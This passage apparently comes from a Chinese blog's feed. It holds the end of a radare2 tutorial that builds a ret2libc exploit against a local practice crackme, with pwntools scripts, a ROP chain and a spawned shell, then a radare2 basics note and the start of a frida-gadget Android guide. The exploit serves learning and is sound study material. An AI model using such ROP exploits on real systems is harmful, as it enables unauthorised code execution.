class="meta">[0x080483d0]&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>dmi: - list symbols of target lib</p><p>可知 0x000XXXXX是对应符号喜爱嗯对libc库的偏移，<code>puts</code>:0x0005f140,<code>system</code>:0x0003a940,<code>exit</code>:0x0002e7b0</p><p>寻找“/bin/sh”地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> e search.in=dbg.maps</span></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> / /bin/sh</span></span><br><span class="line">Searching 7 bytes in [0x8048000-0x8049000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0x8049000-0x804a000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0x804a000-0x804b000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7563000-0xf7564000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7564000-0xf7711000]</span><br><span class="line">hits: 1</span><br><span class="line">Searching 7 bytes in [0xf7711000-0xf7712000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7712000-0xf7714000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7714000-0xf7715000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7715000-0xf7718000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf772f000-0xf7730000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7730000-0xf7732000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7732000-0xf7734000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7734000-0xf7756000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7756000-0xf7757000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xf7757000-0xf7758000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xffd03000-0xffd24000]</span><br><span class="line">hits: 0</span><br><span class="line">0xf76bd02b hit0_0 .b/strtod_l.c-c/bin/shexit 0canonica.</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmm~libc</span></span><br><span class="line">0xf7564000 /lib32/libc-2.23.so</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> ?X 0xf76bd02b-0xf7564000</span></span><br><span class="line">15902b</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>radare2在搜索字符串时默认是在<code>dbg.map</code>，即当前内存映射空间，我们需要在所有内存映射空间搜索，所以需要手动配置<code>e search.in=dbg.maps</code></p><p>radare2 在搜索时用的命令是<code>/</code></p><p>可知：“/bin/sh”相对libc的偏移为0x15902b</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line"># Addresses</span><br><span class="line">puts_plt = 0x8048390</span><br><span class="line">puts_got = 0x804a014</span><br><span class="line">entry_point = 0x80483d0</span><br><span class="line"> </span><br><span class="line"># Offsets</span><br><span class="line">offset_puts = 0x0005f140</span><br><span class="line">offset_system = 0x0003a940</span><br><span class="line">offset_str_bin_sh = 0x15902b</span><br><span class="line">offset_exit = 0x0002e7b0</span><br><span class="line"> </span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    # open process</span><br><span class="line">    p = process(&quot;./megabeets_0x2&quot;)</span><br><span class="line"> </span><br><span class="line">    # Stage 1</span><br><span class="line">    </span><br><span class="line">    # Initial payload</span><br><span class="line">    payload  =  &quot;A&quot;*140</span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    # Take 4 bytes of the output</span><br><span class="line">    leak = p.recv(4)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(&quot;puts is at: 0x%x&quot; % leak)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    # Calculate libc base</span><br><span class="line"> </span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(&quot;libc base: 0x%x&quot; % libc_base)</span><br><span class="line"> </span><br><span class="line">    # Stage 2</span><br><span class="line">    </span><br><span class="line">    # Calculate offsets</span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line"> </span><br><span class="line">    log.info(&quot;system: 0x%x&quot; % system_addr)</span><br><span class="line">    log.info(&quot;binsh: 0x%x&quot; % binsh_addr)</span><br><span class="line">    log.info(&quot;exit: 0x%x&quot; % exit_addr)</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 python payload2.py </span><br><span class="line">[+] Starting local process &apos;./megabeets_0x2&apos;: pid 19479</span><br><span class="line">[*] puts is at: 0xf75af140</span><br><span class="line">[*] libc base: 0xf7550000</span><br><span class="line">[*] system: 0xf758a940</span><br><span class="line">[*] binsh: 0xf76a902b</span><br><span class="line">[*] exit: 0xf757e7b0</span><br><span class="line">[*] Stopped process &apos;./megabeets_0x2&apos; (pid 19479)</span><br></pre></td></tr></table></figure><p>最终payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line"># Addresses</span><br><span class="line">puts_plt = 0x8048390</span><br><span class="line">puts_got = 0x804a014</span><br><span class="line">entry_point = 0x80483d0</span><br><span class="line"> </span><br><span class="line"># Offsets</span><br><span class="line">offset_puts = 0x0005f140</span><br><span class="line">offset_system = 0x0003a940</span><br><span class="line">offset_str_bin_sh = 0x15902b</span><br><span class="line">offset_exit = 0x0002e7b0</span><br><span class="line"> </span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    # open process</span><br><span class="line">    p = process(&quot;./megabeets_0x2&quot;)</span><br><span class="line"> </span><br><span class="line">    # Stage 1</span><br><span class="line">    </span><br><span class="line">    # Initial payload</span><br><span class="line">    payload  =  &quot;A&quot;*140</span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    # Take 4 bytes of the output</span><br><span class="line">    leak = p.recv(4)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(&quot;puts is at: 0x%x&quot; % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    # Calculate libc base</span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(&quot;libc base: 0x%x&quot; % libc_base)</span><br><span class="line"> </span><br><span class="line">    # Stage 2</span><br><span class="line">    </span><br><span class="line">    # Calculate offsets</span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line"> </span><br><span class="line">    log.info(&quot;system is at: 0x%x&quot; % system_addr)</span><br><span class="line">    log.info(&quot;/bin/sh is at: 0x%x&quot; % binsh_addr)</span><br><span class="line">    log.info(&quot;exit is at: 0x%x&quot; % exit_addr)</span><br><span class="line"> </span><br><span class="line">    # Build 2nd payload</span><br><span class="line">    payload2  =  &quot;A&quot;*140</span><br><span class="line">    ropchain2 =  p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)</span><br><span class="line">    #           Then you&apos;ll execute system(&quot;sh&quot;)</span><br><span class="line">    ropchain2 += p32(binsh_addr) </span><br><span class="line"> </span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">    log.success(&quot;Here comes the shell!&quot;)</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 python payload3.py</span><br><span class="line">[+] Starting local process &apos;./megabeets_0x2&apos;: pid 19626</span><br><span class="line">[*] puts is at: 0xf7584140</span><br><span class="line">[*] libc base: 0xf7525000</span><br><span class="line">[*] system is at: 0xf755f940</span><br><span class="line">[*] /bin/sh is at: 0xf767e02b</span><br><span class="line">[*] exit is at: 0xf75537b0</span><br><span class="line">[+] Here comes the shell!</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">yt</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android逆向工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> radare2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>radare2学习笔记一</title>
      <link href="/2019/01/16/radare2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/01/16/radare2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>github版本的radare2安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/radare/radare2.git</span><br><span class="line">$ cd radare2</span><br><span class="line">$ ./sys/install.sh</span><br></pre></td></tr></table></figure></p><p>也可以下载对应平台的二进制文件<a href="http://radare.org/r/down.html" target="_blank" rel="noopener">download page</a></p><p>安装期间我遇到的问题：<code>ld过程中，一个静态库对应的不是x86_64平台</code></p><p>问过Google后，在<a href="https://github.com/radare/radare2/issues/12044" target="_blank" rel="noopener">issue</a>中有提到可能是由于安装了高版本的binutils，使用<code>brew list|grep binutils</code>查看确实是有，使用<code>brew uninstall binutils</code>卸载后，重新安装后成功。</p><p>主要包含的组件：  </p><ul><li>rax2 ———&gt; 用于数值转换</li><li>rasm2 ——-&gt; 反汇编和汇编</li><li>rabin2 ——-&gt; 查看文件格式</li><li>radiff2 ——&gt; 对文件进行 diff</li><li>ragg2/ragg2­cc ——&gt; 用于更方便的生成shellcode</li><li>rahash2 ——&gt; 各种密码算法， hash算法</li></ul><p>常用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">aaa 反编译所有</span><br><span class="line">is 查看符号信息</span><br><span class="line">afl 查看所有的函数列表</span><br><span class="line">s 定位函数</span><br><span class="line">pdf 打印逆向的代码</span><br><span class="line">VV 逻辑视图</span><br><span class="line">p 进入逻辑视图后更改视图类型</span><br><span class="line">tab 切换视图查看函数</span><br></pre></td></tr></table></figure></p><p><strong>应用</strong>：  </p><h4 id="进入r2界面："><a href="#进入r2界面：" class="headerlink" title="进入r2界面："></a>进入r2界面：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ r2 megabeets_0x1</span><br><span class="line"> -- vm is like a small cow in ascii</span><br><span class="line">[0x08048370]&gt;</span><br></pre></td></tr></table></figure><p>当使用r2运行它的时候，它会给我们一个欢迎界面，同时给我们一个shell操作符，并等待下一步的命令，当前它输出了一个地址 (0x08048370)，这就是它自动识别的程序入口点。</p><h4 id="使用a系列命令分析应用："><a href="#使用a系列命令分析应用：" class="headerlink" title="使用a系列命令分析应用："></a>使用a系列命令分析应用：</h4><p><code>aaa</code>等同于<code>af@@ sym.*;af@entry0;afva</code>,详细分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[Cannot determine xref search boundariesr references (aar)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[x] Type matching analysis for all functions (aaft)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br></pre></td></tr></table></figure></p><p>分析完成之后，r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串这些都被称作 ‘flag’, flags被整合进flag spaces，一个flag是所有类似特征的集合，展示所有的 flag，用 ‘fs’ 命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; fs</span><br><span class="line">0    4 * strings</span><br><span class="line">1   37 * symbols</span><br><span class="line">2   31 * sections</span><br><span class="line">3   10 * segments</span><br><span class="line">4    5 * relocs</span><br><span class="line">5    5 * imports</span><br><span class="line">6    1 * functions</span><br></pre></td></tr></table></figure></p><p>使用 <code>fs flagspace</code> 加 <code>f</code> 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; fs imports;f</span><br><span class="line">0x00000000 16 loc.imp.__gmon_start</span><br><span class="line">0x08048320 6 sym.imp.strcmp</span><br><span class="line">0x08048330 6 sym.imp.strcpy</span><br><span class="line">0x08048340 6 sym.imp.puts</span><br><span class="line">0x08048350 6 sym.imp.__libc_start_main</span><br></pre></td></tr></table></figure><p><strong>分析字符串信息</strong></p><p>使用i系列命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; iz</span><br><span class="line">[Strings]</span><br><span class="line">Num Paddr      Vaddr      Len Size Section  Type  String</span><br><span class="line">000 0x00000700 0x08048700  20  21 (.rodata) ascii \n  .:: Megabeets ::.</span><br><span class="line">001 0x00000715 0x08048715  22  23 (.rodata) ascii Think you can make it?</span><br><span class="line">002 0x0000072c 0x0804872c   9  10 (.rodata) ascii Success!\n</span><br><span class="line">003 0x00000736 0x08048736  21  22 (.rodata) ascii Nop, Wrong argument.\n</span><br></pre></td></tr></table></figure></p><p>使用f系列命令展示分析后的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; fs strings;f</span><br><span class="line">0x08048700 21 str..::_Megabeets_::.</span><br><span class="line">0x08048715 23 str.Think_you_can_make_it</span><br><span class="line">0x0804872c 10 str.Success</span><br><span class="line">0x08048736 22 str.Nop__Wrong_argument.</span><br></pre></td></tr></table></figure></p><p><strong>查看地址引用信息（字符串、函数）</strong><br><code>| axt [addr]      find data/code references to this address</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; axt @@ str.*</span><br><span class="line">main 0x8048609 [DATA] push str..::_Megabeets_::.</span><br><span class="line">main 0x8048619 [DATA] push str.Think_you_can_make_it</span><br><span class="line">main 0x8048646 [DATA] push str.Success</span><br><span class="line">main 0x8048658 [DATA] push str.Nop__Wrong_argument.</span><br></pre></td></tr></table></figure><p>‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p><h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><p>r2分析完一个程序后会停留在入口点，刚刚看到感兴趣的字符串都是在 ‘main’ 这个函数里被调用的，因此我们用’seek’ 命令跳转过去，在 r2 里，它的指令是 ‘s’ ,当然你仍然可以用在它后面添加 ‘?’ 的方式来查看它所有可能的用法。</p><p>seek 命令通常是接受一个地址或者数学表达式作为参数，这个表达式可以是操作指令、标志位、或者内存操作相关，现在我们想查找 main 函数，因此我们使用 ‘s main’ 指令就可以了，不过在这之前我们可以先看看 r2 到底为我们分析出了哪些函数，因此我们用 ‘afl’ 指令，这个指令代表着分析函数列表（Analyze Functions List）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; afl</span><br><span class="line">0x080482ec    3 35           sym._init</span><br><span class="line">0x08048320    1 6            sym.imp.strcmp</span><br><span class="line">0x08048330    1 6            sym.imp.strcpy</span><br><span class="line">0x08048340    1 6            sym.imp.puts</span><br><span class="line">0x08048350    1 6            sym.imp.__libc_start_main</span><br><span class="line">0x08048360    1 6            sub.__gmon_start_8048360</span><br><span class="line">0x08048370    1 33           entry0</span><br><span class="line">0x080483a0    1 4            sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x080483b0    4 43           sym.deregister_tm_clones</span><br><span class="line">0x080483e0    4 53           sym.register_tm_clones</span><br><span class="line">0x08048420    3 30           sym.__do_global_dtors_aux</span><br><span class="line">0x08048440    4 43   -&gt; 40   entry.init0</span><br><span class="line">0x0804846b   19 282          sym.rot13</span><br><span class="line">0x08048585    1 112          sym.beet</span><br><span class="line">0x080485f5    5 127          main</span><br><span class="line">0x08048680    4 93           sym.__libc_csu_init</span><br><span class="line">0x080486e0    1 2            sym.__libc_csu_fini</span><br><span class="line">0x080486e4    1 20           sym._fini</span><br></pre></td></tr></table></figure><h4 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h4><p><code>s sym.beet</code> 跳到main函数，<code>pdf</code>输出反汇编信息<br><img src="https://note.youdao.com/yws/api/personal/file/WEBd3905e87978526c0b3871861120653b2?method=download&amp;shareKey=0611918b440d3ae1ff84af208dec4075" alt="image"></p><h4 id="视图模式和图形模式（visual-mode-amp-graph-mode）"><a href="#视图模式和图形模式（visual-mode-amp-graph-mode）" class="headerlink" title="视图模式和图形模式（visual mode &amp; graph mode）"></a>视图模式和图形模式（visual mode &amp; graph mode）</h4><p>输入VV，切换到视图模式，包含引用关系；在逻辑视图模式可以使用p键切换回图形模式。</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBaec8dab48bc65d46a020c824734710c1?method=download&amp;shareKey=3871cebd7d30e431a84f4c752ff4e3c0" alt="iamge"></p><p><strong>移动</strong></p><p>你可以使用k和j来上下移动，按回车键将在call和jump的时候跳转到目的地址，同时上图里你能看到有一些方括号里面有数字，你可以直接在键盘上按相应的数字就会跳转到对应的函数和地址处 ！</p><p><strong>帮助</strong></p><p>在使用r2的任何阶段，你都可以按 ?来调出帮助画面，这能帮助你更好的使用 r2 .</p><p><strong>交叉引用</strong></p><p>x / X 可以列出当前函数的引用状况，之后再输入相应的数字就可以跳转到指定的引用处了.</p><h4 id="radare2-命令解释器"><a href="#radare2-命令解释器" class="headerlink" title="radare2 命令解释器"></a>radare2 命令解释器</h4><p>视图模式下，使用 :command命令来执行你想要的r2命令.</p><p><strong>注释</strong></p><p>通过 ;[-] 来添加相应的注释</p><p><strong>标记</strong></p><p>m\&lt;key> 可以用来标记特定的偏移地址，之后输入对应的key就可以跳转到你设置的地方.</p><p><strong>退出</strong></p><p>按 q 返回到 r2 的 shell操作界面.</p><h4 id="rahash2-组件使用"><a href="#rahash2-组件使用" class="headerlink" title="rahash2 组件使用"></a>rahash2 组件使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ rahash2 -E rot -S s:13 -s &quot;Megabeets\n&quot;</span><br><span class="line">Zrtnorrgf</span><br></pre></td></tr></table></figure><h4 id="debug模式"><a href="#debug模式" class="headerlink" title="debug模式"></a>debug模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[0x08048585]&gt; ood?</span><br><span class="line">Usage: ood [args]   # reopen in debugger mode (with args)</span><br><span class="line">| oodr [rarun2]  same as dor ..;ood</span><br><span class="line">[0x08048585]&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android逆向工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> radare2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android使用frida-gadget插桩</title>
      <link href="/2019/01/11/Android%E4%BD%BF%E7%94%A8frida-gadget%E6%8F%92%E6%A1%A9/"/>
      <url>/2019/01/11/Android%E4%BD%BF%E7%94%A8frida-gadget%E6%8F%92%E6%A1%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="frida-介绍"><a href="#frida-介绍" class="headerlink" title="frida 介绍"></a>frida 介绍</h1><p><em>-来自官网</em><br><a href="https://www.frida.re/" target="_blank" rel="noopener">frida</a> dynamic instrumentation toolkit for developers, reverse-engineers,and security researchers.</p><p>即：frida是一个适用于开发者、逆向工程师、安全研究员的动态插桩工具。</p><p>使用javascript脚本注入进程，执行二进制插桩。可以与调试器共存。</p><p>在脚本和原生函数中实现了双向的bridge，既可hook函数并修改参数，也可使用脚本调用原生函数。</p><p>除本地代码外，内置对Java和Objective C运行时的支持。</p><p>跨平台支持Windows，Mac，GNU/Linux，iOS，Android和 QNX。</p><h2 id="frida-插桩实现"><a href="#frida-插桩实现" class="headerlink" title="frida 插桩实现"></a>frida 插桩实现</h2><p>#TODO</p><h2 id="安装部署（Android）"><a href="#安装部署（Android）" class="headerlink" title="安装部署（Android）"></a>安装部署（Android）</h2><ol><li>有root：下载frida-server,adb推入后以rootz执行,默认监听TCP 27042端口，可通过adb forward转发到计算机上；</li><li>无root：将frida-gadget.so文件集成到apk中，若目标应用时第三方apk还需要反编译修改smail文件，添加System.loadLibrary()调用。</li></ol><p>接下来着重介绍无root情况下的使用方式：</p><p><em>场景：Android studio，作为开发者使用frida-gadget</em></p><p>从<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">frida-gadget</a>下载Android版本的gadget压缩包，不同的平台对应不同的gadget压缩包，可依据文件名区分。例如：xxx-android-x86.so.xz，对应的就是x86平台的手机。若没有对应手机架构的压缩包，可选取兼容版本。例如：arm-v7架构，使用的ABI类型是armeabi-v7a，可兼容ABI类型是armeabi。则可选择xxx-android-arm.so.xz压缩包。</p><p>在libs文件夹中新建平台架构对应ABI类型的文件夹，例如：armeabi/, 将解压缩出来的so文件放入Android工程的该文件下，并重命名为libgadget.so。接下来修改build.gradle，添加如下配置：</p><p>在android{}中添加如下配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sourceSets.main&#123;</span><br><span class="line">    jniLibs.srcDirs = [&apos;libs&apos;]</span><br><span class="line">    jni.srcDirs = []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在externalNativeBuild{}中添加如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ndk&#123;</span><br><span class="line">    abiFilters &quot;armeabi-v7a&quot;</span><br><span 